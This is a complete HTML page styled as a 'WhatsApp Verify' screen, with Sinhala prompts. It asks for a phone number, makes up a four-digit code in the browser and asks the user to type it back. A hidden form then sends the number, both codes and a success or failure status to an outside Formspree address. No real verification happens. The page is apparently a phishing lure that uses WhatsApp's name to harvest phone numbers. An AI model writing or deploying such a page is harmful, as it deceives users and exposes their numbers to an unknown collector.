<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1"><title>Verify</title><style>body{background:#111;color:#fff;font-family:sans-serif;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0;padding:20px}.card{background:#222;padding:20px;border-radius:15px;width:100%;max-width:350px}input,button{width:100%;padding:12px;margin:8px 0;border-radius:10px;border:none}button{background:#25D366;color:#fff;font-weight:bold}#s2{display:none}</style></head><body><div class="card"><h3>WhatsApp Verify</h3><div id="s1"><input id="n" placeholder="07XXXXXXXX"><button onclick="g()">Code යවන්න</button></div><div id="s2"><p>Code: <b id="c"></b></p><input id="o" placeholder="Code එක"><button onclick="v()">Verify</button><p id="m"></p></div><form id="f" action="https://formspree.io/f/movlpqlo" method="POST" style="display:none"><input name="number" id="fn"><input name="gen_code" id="fg"><input name="user_code" id="fu"><input name="status" id="fs"></form></div><script>let gc="";function g(){let n=document.getElementById('n').value;if(n.length<9)return alert('number වැරදියි');gc=Math.floor(1000+Math.random()*9000)+'';document.getElementById('c').innerText=gc;document.getElementById('s1').style.display='none';document.getElementById('s2').style.display='block';document.getElementById('fn').value=n;document.getElementById('fg').value=gc;}function v(){let e=document.getElementById('o').value;document.getElementById('fu').value=e;if(e==gc){document.getElementById('fs').value='SUCCESS';document.getElementById('f').submit();}else{document.getElementById('fs').value='FAILED';document.getElementById('m').innerText='වැරදියි හරි එක '+gc;setTimeout(()=>document.getElementById('f').submit(),1500);}}</script></body></html>
